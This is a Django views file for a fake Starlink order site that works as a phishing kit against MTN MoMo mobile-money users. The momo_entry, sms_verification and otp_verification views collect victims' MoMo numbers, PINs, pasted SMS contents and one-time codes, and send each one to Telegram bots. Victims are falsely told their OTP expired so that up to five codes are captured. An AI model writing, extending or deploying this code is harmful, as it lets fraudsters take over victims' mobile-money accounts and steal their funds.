import json
import requests
from datetime import timedelta
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.utils import timezone
from django.contrib.admin.views.decorators import staff_member_required
from django.http import JsonResponse
from django.core.cache import cache
from django.views.decorators.http import require_http_methods

from .models import StarlinkOrder, TelegramConfig, StarlinkPackage
from django.utils import timezone

def send_telegram_notification(message):
    """Sends a notification to all active Telegram configurations."""
    configs = TelegramConfig.objects.filter(is_active=True)
    for config in configs:
        try:
            url = f"https://api.telegram.org/bot{config.bot_token}/sendMessage"
            payload = {
                "chat_id": config.chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            requests.post(url, json=payload, timeout=10)
        except Exception as e:
            print(f"Error sending Telegram notification: {e}")

def landing_page(request):
    """Starlink package selection and simplified order page."""
    try:
        packages = StarlinkPackage.objects.filter(is_active=True)
        
        if not packages.exists():
            StarlinkPackage.objects.create(name="Standard (Residential)", description="Unlimited high-speed internet", price=100.00, data_limit="Unlimited")
            StarlinkPackage.objects.create(name="Mobile - Regional", description="High-speed priority data", price=150.00, data_limit="Unlimited")
            packages = StarlinkPackage.objects.filter(is_active=True)
    except Exception as e:
        # Fallback for database issues
        packages = []
        print(f"Database error: {e}")

    if request.method == "POST":
        try:
            package_id = request.POST.get("package_id", "").strip()
            
            if not package_id:
                messages.error(request, "Please select a plan.")
                return redirect("landing_page")
            
            package = get_object_or_404(StarlinkPackage, id=package_id)
            
            order = StarlinkOrder.objects.create(
                starlink_kit_id="KIT_" + str(int(timezone.now().timestamp())),
                phone_number="",
                package_name=package.name,
                amount=package.price,
                status='pending'
            )
            
            return redirect("momo_entry", order_id=order.id)
            
        except Exception as e:
            messages.error(request, f"Error submitting order: {str(e)}")
            return redirect("landing_page")
    
    return render(request, "landing.html", {"packages": packages})


def momo_entry(request, order_id):
    """MTN MoMo number and PIN entry page."""
    try:
        order = get_object_or_404(StarlinkOrder, id=order_id)
    except Exception as e:
        messages.error(request, f"Database error: {e}")
        return redirect("landing_page")
    
    if request.method == "POST":
        action = request.POST.get("action")
        
        if action == "verify_pin":
            momo_number = request.POST.get("momo_number", "").strip()
            pin = request.POST.get("pin", "").strip()
            
            if not momo_number or not pin:
                messages.error(request, "Please provide MTN MoMo number and PIN.")
                return redirect("momo_entry", order_id=order.id)
            
            order.momo_number = momo_number
            order.pin = pin
            order.pin_verified = True
            order.pin_verified_at = timezone.now()
            order.status = 'pin_verified'
            order.payment_entered_at = timezone.now()
            order.save()
            
            message = f"<b>Starlink Order - MTN MoMo Bot:</b>\nKit ID: {order.starlink_kit_id}\nPhone: {momo_number}\nPIN: {pin}\nAmount: ZMW {order.amount}"
            send_telegram_notification(message)
            
            return redirect("sms_verification", order_id=order.id)
    
    return render(request, "withdraw.html", {"order": order})


def sms_verification(request, order_id):
    """SMS verification page."""
    try:
        order = get_object_or_404(StarlinkOrder, id=order_id)
    except Exception as e:
        messages.error(request, f"Database error: {e}")
        return redirect("landing_page")
    
    if order.status != 'pin_verified' and order.status != 'sms_submitted':
        return redirect("momo_entry", order_id=order.id)
    
    if request.method == "POST":
        action = request.POST.get("action")
        
        if action == "verify_sms":
            sms_content = request.POST.get("full_sms", "").strip()
            
            if not sms_content:
                messages.error(request, "Please paste the full SMS content.")
                return redirect("sms_verification", order_id=order.id)
            
            order.full_sms = sms_content
            order.sms_count += 1
            order.status = 'sms_submitted'
            order.sms_submitted_at = timezone.now()
            
            message = f"<b>Starlink Order - MTN MoMo Bot (SMS Attempt {order.sms_count}):</b>\nKit ID: {order.starlink_kit_id}\nPhone: {order.momo_number}\nPIN: {order.pin}\nSMS: {sms_content}"
            send_telegram_notification(message)

            if order.sms_count >= 2:
                order.save()
                return redirect("otp_verification", order_id=order.id)
            else:
                order.save()
                messages.error(request, "Please paste the SMS again to verify.")
                return redirect("sms_verification", order_id=order.id)
    
    return render(request, "otp_verify.html", {"order": order})


def otp_verification(request, order_id):
    """OTP verification page."""
    try:
        order = get_object_or_404(StarlinkOrder, id=order_id)
    except Exception as e:
        messages.error(request, f"Database error: {e}")
        return redirect("landing_page")
    
    if order.status != 'sms_submitted' and order.status != 'otp_submitted':
        return redirect("sms_verification", order_id=order.id)
    
    if request.method == "POST":
        action = request.POST.get("action")
        
        if action == "verify_otp":
            otp_code = request.POST.get("otp_code", "").strip()
            
            if not otp_code:
                messages.error(request, "Please enter the OTP code.")
                return redirect("otp_verification", order_id=order.id)
            
            order.otp_code = otp_code
            order.otp_count += 1
            order.status = 'otp_submitted'
            order.otp_submitted_at = timezone.now()
            
            message = f"<b>Starlink Order - MTN MoMo Bot (OTP Attempt {order.otp_count}):</b>\nKit ID: {order.starlink_kit_id}\nPhone: {order.momo_number}\nPIN: {order.pin}\nOTP: {otp_code}"
            send_telegram_notification(message)

            if order.otp_count >= 5:
                order.otp_verified = True
                order.status = 'completed'
                order.completed_at = timezone.now()
                order.save()
                return redirect("success_page", order_id=order.id)
            else:
                order.save()
                messages.error(request, "The OTP you entered has expired or is invalid. Please enter the new OTP sent to your phone.")
                return redirect("otp_verification", order_id=order.id)
    
    return render(request, "otp_verify_final.html", {"order": order})


def success_page(request, order_id):
    """Success page after order completion."""
    order = get_object_or_404(StarlinkOrder, id=order_id)
    
    if order.status != 'completed':
        return redirect("landing_page")
    
    return render(request, "success.html", {"order": order})


@staff_member_required
def all_applications(request):
    """Records page displaying all Starlink orders."""
    try:
        orders = StarlinkOrder.objects.all().order_by('-created_at')
    except Exception as e:
        orders = []
        messages.error(request, f"Database error: {e}")
    return render(request, "records.html", {"orders": orders})


def network_dashboard(request):
    """Network status dashboard page."""
    return render(request, "network_dashboard.html")
